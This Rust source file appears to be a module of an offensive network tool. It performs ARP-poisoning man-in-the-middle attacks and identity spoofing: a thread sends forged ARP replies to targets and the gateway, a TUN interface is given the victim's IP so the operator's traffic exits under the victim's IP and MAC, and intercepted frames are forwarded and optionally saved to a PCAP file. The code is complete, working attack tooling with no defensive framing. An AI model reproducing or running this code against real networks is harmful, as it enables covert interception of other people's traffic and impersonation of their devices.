// Linux-only: MITM packet forwarding with TUN-based identity spoofing.
// The TUN interface is assigned the impersonation target's IP, so all traffic
// the user sends through it automatically carries the victim's IP as source.
// Inbound traffic destined for the victim is injected back into the TUN so the
// user's applications receive it transparently.

use anyhow::{anyhow, Context, Result};
use pnet::datalink::{DataLinkReceiver, DataLinkSender};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::udp::UdpPacket;
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::fs::File;
use std::io::{Read, Write};
use std::net::Ipv4Addr;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use crate::arp;

// ── TUN interface (Linux) ─────────────────────────────────────────────────────

const TUNSETIFF: libc::c_ulong = 0x400454ca;
const IFF_TUN: libc::c_short = 0x0001;
const IFF_NO_PI: libc::c_short = 0x1000;

#[repr(C)]
struct Ifreq {
    ifr_name: [u8; 16],
    ifr_flags: libc::c_short,
    _pad: [u8; 22],
}

fn create_tun(name: &str) -> Result<File> {
    let fd = unsafe {
        libc::open(
            b"/dev/net/tun\0".as_ptr() as *const libc::c_char,
            libc::O_RDWR,
        )
    };
    if fd < 0 {
        return Err(anyhow!(
            "Failed to open /dev/net/tun (are you root?): {}",
            std::io::Error::last_os_error()
        ));
    }

    let mut ifr = Ifreq {
        ifr_name: [0u8; 16],
        ifr_flags: IFF_TUN | IFF_NO_PI,
        _pad: [0u8; 22],
    };
    let name_b = name.as_bytes();
    let len = name_b.len().min(15);
    ifr.ifr_name[..len].copy_from_slice(&name_b[..len]);

    let ret = unsafe {
        libc::ioctl(fd, TUNSETIFF, &mut ifr as *mut Ifreq as *mut libc::c_void)
    };
    if ret < 0 {
        unsafe { libc::close(fd) };
        return Err(anyhow!(
            "TUNSETIFF ioctl failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    Ok(unsafe { File::from_raw_fd(fd) })
}

fn configure_tun(name: &str, ip: Ipv4Addr) -> Result<()> {
    use std::process::Command;

    let status = Command::new("ip")
        .args(["addr", "add", &format!("{}/32", ip), "dev", name])
        .status()
        .context("Failed to run 'ip addr add'")?;
    if !status.success() {
        return Err(anyhow!("'ip addr add' returned {}", status));
    }

    let status = Command::new("ip")
        .args(["link", "set", name, "up"])
        .status()
        .context("Failed to run 'ip link set up'")?;
    if !status.success() {
        return Err(anyhow!("'ip link set up' returned {}", status));
    }

    Ok(())
}

fn set_nonblocking(file: &File) -> Result<()> {
    let fd = file.as_raw_fd();
    unsafe {
        let flags = libc::fcntl(fd, libc::F_GETFL, 0);
        if flags < 0 {
            return Err(anyhow!(
                "fcntl F_GETFL failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        let ret = libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK);
        if ret < 0 {
            return Err(anyhow!(
                "fcntl F_SETFL failed: {}",
                std::io::Error::last_os_error()
            ));
        }
    }
    Ok(())
}

fn teardown_tun(name: &str) {
    let _ = std::process::Command::new("ip")
        .args(["link", "delete", name])
        .status();
}

// ── PCAP writer ───────────────────────────────────────────────────────────────

pub struct PcapWriter {
    file: File,
}

impl PcapWriter {
    pub fn new(path: &str) -> Result<Self> {
        let mut file =
            File::create(path).with_context(|| format!("Cannot create PCAP file '{}'", path))?;
        file.write_all(&0xa1b2c3d4u32.to_le_bytes())?; // magic
        file.write_all(&2u16.to_le_bytes())?;           // major version
        file.write_all(&4u16.to_le_bytes())?;           // minor version
        file.write_all(&0i32.to_le_bytes())?;           // thiszone
        file.write_all(&0u32.to_le_bytes())?;           // sigfigs
        file.write_all(&65535u32.to_le_bytes())?;       // snaplen
        file.write_all(&1u32.to_le_bytes())?;           // LINKTYPE_ETHERNET
        Ok(Self { file })
    }

    pub fn write_packet(&mut self, data: &[u8]) -> std::io::Result<()> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default();
        let len = data.len() as u32;
        self.file.write_all(&(now.as_secs() as u32).to_le_bytes())?;
        self.file.write_all(&now.subsec_micros().to_le_bytes())?;
        self.file.write_all(&len.to_le_bytes())?;
        self.file.write_all(&len.to_le_bytes())?;
        self.file.write_all(data)
    }
}

// ── Traffic logging ───────────────────────────────────────────────────────────

fn log_packet(label: &str, eth_frame: &[u8]) {
    if let Some(eth) = EthernetPacket::new(eth_frame) {
        if eth.get_ethertype() == EtherTypes::Ipv4 {
            if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                let src = ip.get_source();
                let dst = ip.get_destination();
                match ip.get_next_level_protocol() {
                    IpNextHeaderProtocols::Tcp => {
                        if let Some(tcp) = TcpPacket::new(ip.payload()) {
                            println!(
                                "[{}] TCP  {}:{} → {}:{}",
                                label,
                                src,
                                tcp.get_source(),
                                dst,
                                tcp.get_destination()
                            );
                        }
                    }
                    IpNextHeaderProtocols::Udp => {
                        if let Some(udp) = UdpPacket::new(ip.payload()) {
                            println!(
                                "[{}] UDP  {}:{} → {}:{}",
                                label,
                                src,
                                udp.get_source(),
                                dst,
                                udp.get_destination()
                            );
                        }
                    }
                    proto => {
                        println!("[{}] {}  {} → {}", label, proto, src, dst);
                    }
                }
            }
        }
    }
}

// ── MITM runner ───────────────────────────────────────────────────────────────

pub fn run_mitm(
    tx: Box<dyn DataLinkSender>,
    rx: Box<dyn DataLinkReceiver>,
    targets: &[(Ipv4Addr, MacAddr)],
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    impersonate: (Ipv4Addr, MacAddr),   // the victim whose identity we steal
    my_mac: MacAddr,
    interval: u64,
    pcap_path: Option<&str>,
    debug: bool,
    running: Arc<AtomicBool>,
) -> Result<()> {
    let (impersonate_ip, impersonate_mac) = impersonate;

    // ── TUN interface ─────────────────────────────────────────────────────────
    let tun_name = "tun0";
    println!("Creating TUN interface {}...", tun_name);
    let tun_write_file = create_tun(tun_name)?;
    configure_tun(tun_name, impersonate_ip)?;

    // Clone the fd: tun_read goes to Thread 3, tun_write stays in Thread 2.
    let tun_read_file = tun_write_file
        .try_clone()
        .context("Failed to clone TUN fd")?;
    set_nonblocking(&tun_read_file)?;

    println!(
        "TUN {} up — assigned {} (impersonating {})",
        tun_name, impersonate_ip, impersonate_mac
    );

    // ── Shared resources ──────────────────────────────────────────────────────
    let tx = Arc::new(Mutex::new(tx));

    let pcap: Option<Arc<Mutex<PcapWriter>>> = match pcap_path {
        Some(path) => {
            let w = PcapWriter::new(path)?;
            println!("Capturing packets to {}", path);
            Some(Arc::new(Mutex::new(w)))
        }
        None => None,
    };

    let targets_vec: Vec<(Ipv4Addr, MacAddr)> = targets.to_vec();

    println!("\n--- MITM Active ---");
    println!("Impersonating: {} ({})", impersonate_ip, impersonate_mac);
    println!("Your traffic via tun0 exits as {} / {}", impersonate_ip, impersonate_mac);
    println!("Press Ctrl+C to stop.\n");

    // ── Thread 1: ARP poisoner ────────────────────────────────────────────────
    {
        let tx = tx.clone();
        let targets = targets_vec.clone();
        let running = running.clone();

        thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                {
                    let mut guard = tx.lock().unwrap();
                    for &(target_ip, target_mac) in &targets {
                        if let Some(p) =
                            arp::build_arp_reply(target_mac, target_ip, my_mac, gateway_ip)
                        {
                            let _ = guard.send_to(&p, None);
                        }
                        if let Some(p) =
                            arp::build_arp_reply(gateway_mac, gateway_ip, my_mac, target_ip)
                        {
                            let _ = guard.send_to(&p, None);
                        }
                    }
                }
                let deadline = Instant::now() + Duration::from_secs(interval);
                while Instant::now() < deadline && running.load(Ordering::SeqCst) {
                    thread::sleep(Duration::from_millis(100));
                }
            }
        });
    }

    // ── Thread 2: RX dispatcher ───────────────────────────────────────────────
    // Reads raw ethernet frames and:
    //   • inbound to victim  → strip eth, write IP packet to TUN
    //   • victim's outbound  → forward to gateway (with our MAC so ARP stays poisoned) + log/pcap
    {
        let tx = tx.clone();
        let targets = targets_vec.clone();
        let pcap = pcap.clone();
        let running = running.clone();
        let mut tun_write = tun_write_file;

        thread::spawn(move || {
            let mut rx = rx;
            while running.load(Ordering::SeqCst) {
                let frame = match rx.next() {
                    Ok(f) => f,
                    Err(_) => continue, // read_timeout expired
                };

                let eth = match EthernetPacket::new(frame) {
                    Some(e) => e,
                    None => continue,
                };

                if eth.get_ethertype() != EtherTypes::Ipv4 {
                    continue;
                }

                let ip_payload = eth.payload();
                let ip = match Ipv4Packet::new(ip_payload) {
                    Some(p) => p,
                    None => continue,
                };

                let src = ip.get_source();
                let dst = ip.get_destination();

                if dst == impersonate_ip {
                    // Gateway → victim: inject into TUN so the user's apps receive it
                    let _ = tun_write.write_all(ip_payload);
                    if debug {
                        log_packet("↓ net→you", frame);
                    }
                    if let Some(ref w) = pcap {
                        if let Ok(mut w) = w.lock() {
                            let _ = w.write_packet(frame);
                        }
                    }
                } else {
                    // Check if this is the actual victim's outbound traffic coming in
                    let is_victim_src = targets.iter().any(|&(ip, _)| ip == src);
                    if is_victim_src {
                        // Forward to gateway with our MAC as eth src so the gateway's ARP
                        // table keeps seeing impersonate_ip → my_mac (maintains MITM).
                        if let Some(fwd) =
                            arp::build_raw_ip_frame(my_mac, gateway_mac, ip_payload)
                        {
                            let mut guard = tx.lock().unwrap();
                            let _ = guard.send_to(&fwd, None);
                        }
                        if debug {
                            log_packet("↑ victim→net", frame);
                        }
                        if let Some(ref w) = pcap {
                            if let Ok(mut w) = w.lock() {
                                let _ = w.write_packet(frame);
                            }
                        }
                    }
                }
            }
        });
    }

    // ── Thread 3: TUN reader ──────────────────────────────────────────────────
    // Reads IP packets the user sends through tun0 and sends them out on the
    // wire with the victim's MAC as ethernet source.
    {
        let tx = tx.clone();
        let pcap = pcap.clone();
        let running = running.clone();
        let mut tun_read = tun_read_file;

        thread::spawn(move || {
            let mut buf = vec![0u8; 65535];
            while running.load(Ordering::SeqCst) {
                let n = match tun_read.read(&mut buf) {
                    Ok(0) => {
                        thread::sleep(Duration::from_millis(1));
                        continue;
                    }
                    Ok(n) => n,
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(1));
                        continue;
                    }
                    Err(_) => {
                        thread::sleep(Duration::from_millis(1));
                        continue;
                    }
                };

                let ip_payload = &buf[..n];

                // Wrap IP packet in ethernet: src = victim MAC, dst = gateway MAC
                if let Some(eth_frame) =
                    arp::build_raw_ip_frame(impersonate_mac, gateway_mac, ip_payload)
                {
                    let mut guard = tx.lock().unwrap();
                    let _ = guard.send_to(&eth_frame, None);
                    drop(guard);

                    if debug {
                        println!("[↑ you→net] {} bytes as {}", n, impersonate_ip);
                    }
                    if let Some(ref w) = pcap {
                        if let Ok(mut w) = w.lock() {
                            let _ = w.write_packet(&eth_frame);
                        }
                    }
                }
            }
        });
    }

    // ── Wait for Ctrl+C ───────────────────────────────────────────────────────
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(100));
    }

    println!("\nStopped. Restoring ARP caches...");
    {
        let mut guard = tx.lock().unwrap();
        arp::restore_arp(&mut *guard, targets, gateway_ip, gateway_mac, debug);
    }

    teardown_tun(tun_name);
    println!("TUN {} removed. Done.", tun_name);

    Ok(())
}
